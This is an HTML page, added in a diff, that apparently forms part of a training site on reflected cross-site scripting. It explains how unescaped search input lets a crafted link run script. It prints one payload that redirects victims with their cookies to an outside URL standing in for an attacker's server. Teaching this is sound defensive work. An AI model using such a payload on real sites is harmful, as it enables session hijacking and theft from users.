@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<center>
+
+    <head>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TF3WKZS5Q4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-TF3WKZS5Q4');
+</script>
+
+        <meta charset="utf-8">
+        <title>XSS-Reflected</title>
+        <meta name="viewport" content="width=device-width, initial scale=1">
+        <meta name="author" content="srishanthkumar">
+    </head>
+
+    <body>
+
+        <div>
+            <style>
+            .rbutton {
+                border-radius: 50%;
+            }
+
+            body {
+                background-color: grey;
+            }
+        </style>
+            <button class="rbutton"><a href="xss-ref.html">0</a></button>
+            <button class="rbutton"><a href="1.html">1</a></button>
+            <button class="rbutton"><a href="2.html">2</a></button>
+            <button class="rbutton"><a href="3.html">3</a></button>
+            <button><a href="../index.php">Demo</a></button>
+        </div>
+
+        <h1>Reflected Cross-Site Scripting - Demonstration</h1>
+        <p style="font-size:20px;">
+            I created an input field which takes user input as a HTTP request and uses it for an immediate response.<br>
+            When you give something as an input here, it acts similar to a site search, which takes the term you put in,
+            and searches the database for that term, which requires the term to be passed to a backend function.
+            If it doesn't escape HTTP controllers like script tags, you have an XSS-Reflected vulnerability.<br>
+            The expected input is a normal name. You can observe that once you submit name, the url is updated.<br>
+            <img src="../images/name.png" alt="Normal name" style="width: 450px; height: 270px;"><br>
+            If a malicious script is given as an option in the url, it will be also create a link which can be sent
+            to victims and point them to a trusted site, but with a malicious script resulting in leakage of PII.<br>
+            This vulnerability can be used for various malicious purposes. You can get the user's cookie by using
+            <code>document.cookie</code>. You can even send this cookie to a malicious website by encasing this in
+            script tags: <code><b>window.location="https://github.com/srishanthkumar97?cookie="+document.cookie</b></code><br>
+            <code>Note: This is a demonstration of how malicious XSS payloads could be crafted and distributed. Do not attempt to use such attacks against any website or system.</code><br>
+            <img src="../images/mal.png" alt="Malicious script" style="width: 470px; height: 200px"><br>
+            Clicking this link will result in the victim being redirected to another website along with their cookie.
+            The website they are redirected to will be a malicious site whose server logs the cookies which leads to
+            session hijacking attack on the victim with the stolen cookie.<br>
+            <img src="../images/cookie.png" alt="Stealing cookies" style="width: 900px; height: 300px"><br>
+        </p>
+    </body>
+
+    <footer>
+        <button><a href="./2.html">Next</a></button>
+    </footer>
+</center>
+
+</html>
